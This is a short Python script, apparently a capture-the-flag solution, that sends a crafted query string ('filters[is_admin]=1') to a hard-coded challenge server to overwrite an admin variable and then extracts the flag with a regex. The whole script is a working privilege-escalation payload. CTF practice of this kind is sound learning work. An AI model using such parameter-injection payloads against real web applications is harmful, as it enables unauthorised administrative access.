#!/usr/bin/env python3
import requests, re

PAYLOAD = "action=debug&filters[is_admin]=1" # now is_admin == true
SITE = "http://52.59.124.14:10018/"
REGEX = r"ENO{.*?}"

r = requests.get(SITE + "?" + PAYLOAD)
flag = re.findall(REGEX, r.text)[0]
print(flag) # ENO{N3ver_3xtract_ok?}